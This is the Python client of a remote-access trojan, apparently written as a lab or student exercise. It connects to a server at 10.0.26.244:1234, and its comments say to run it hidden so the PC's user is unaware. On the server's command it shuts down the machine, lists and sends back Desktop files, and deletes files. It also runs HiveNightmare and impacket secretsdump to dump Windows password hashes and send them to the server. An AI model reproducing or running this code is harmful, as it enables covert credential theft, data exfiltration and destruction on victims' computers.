import socket
import os
import subprocess
import sys
from subprocess import call

FORMAT = "utf-8"

# installing the required packages
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pycryptodomex'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'impacket'])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.26.244", 1234))
# this file should be run in the background so the person using the pc is not aware of the process running
# For this to happen, use the extension.pyw,

#Communication is mostly done by server sending a message and a client responding, except for sending a file



while (True):
    msg = s.recv(2048)
    decodedMsg = msg.decode("utf-8")
    print(decodedMsg)
    
    # The command shuts down the pc so avoid running it
    if decodedMsg == "s":
        print('Shutting Down')
        #send confirmation
        s.sendall(bytes("shutting down","utf-8"))
        os.system("shutdown /s /t 1")
    
    #Opens Calculator   
    elif decodedMsg == "openCalc":
        os.system('cmd /c "calc"')
        s.sendall(bytes("opened calc","utf-8"))

    elif decodedMsg == "showdesktop":
        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
        result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
        s.sendall(bytes(result.stdout.decode(), "utf-8"))


    # code to retrieve the registry files (hives)
    elif decodedMsg == "retrieveh":
        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
        cmdline = "start .\HiveNightmare.exe"
        subprocess.call(cmdline, cwd=dir, shell=True) # run `cmdline` in `dir`
        s.sendall(bytes("done", "utf-8"))
        
    # dump the hashes and send them via the connection
    elif decodedMsg == "hashdump":
        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
        systemN = ""
        securityN = ""
        samN = ""
        for i in os.listdir(dir):
            if 'SYSTEM' in i:
                systemN = i
            elif 'SECURITY' in i:
                securityN = i
            elif 'SAM' in i:
                samN = i

        cmdline2 = "python secretsdump.py -system " + systemN + " -security " + securityN + " -sam " + samN + " local"
        resulth = subprocess.run(cmdline2, cwd=dir, stdout=subprocess.PIPE, shell=True)
        print(resulth.stdout.decode())
        s.sendall(bytes(resulth.stdout.decode(), "utf-8"))  
        # just a response so we don't break the message response pattern  
    
    
    elif decodedMsg == "getaccess":
        s.sendall(bytes("nice", "utf-8"))

    #sends the available files and then the user can type the file or cancel to return
    elif decodedMsg == "SendFiles-Desktop":
        dir =  "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
        result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
        s.sendall(bytes(result.stdout.decode(), "utf-8"))
        msg = s.recv(1024)
        decodedMsg = msg.decode("utf-8")
        #returns back
        if decodedMsg == "cancel":
            s.sendall(bytes("cancelled", "utf-8"))

        else:
            file = dir + "\\" + decodedMsg
            #rb needed for sending binary file
            #only used for text files 
            f = open(file, "rt")
            message = f.read(2048)
            while message:
                print('Sending...')
                s.sendall(bytes(message, "utf-8"))
                message = f.read(2048)
            f.close()
            s.sendall(bytes("done sending","utf-8"))
            
    #select a file to delete 
    #similar to SendFiles-Desktop
    elif decodedMsg == "DeleteFiles-Desktop":
        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
        result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
        s.sendall(bytes(result.stdout.decode(), "utf-8"))
        msg = s.recv(1024)
        decodedMsg = msg.decode("utf-8")
        if decodedMsg == "cancel":
            s.sendall(bytes("cancelled", "utf-8"))

        else:
            command = "del " + decodedMsg
            subprocess.run(command, cwd=dir, stdout=subprocess.PIPE, shell=True)
            s.sendall(bytes("File Deleted", "utf-8"))
            
    #https://www.lifewire.com/what-is-telnet-2626026#toc-telnet-games--additional-information
    #This must be enabled in the VM to work
    elif decodedMsg == "maytheforcebewithyou":
        s.sendall(bytes("memed", "utf-8"))
        os.system("start cmd /c telnet towel.blinkenlights.nl")
        
    #if message does not match any of the cases above
    else:
        s.sendall(bytes("Invalid Command", "utf-8"))



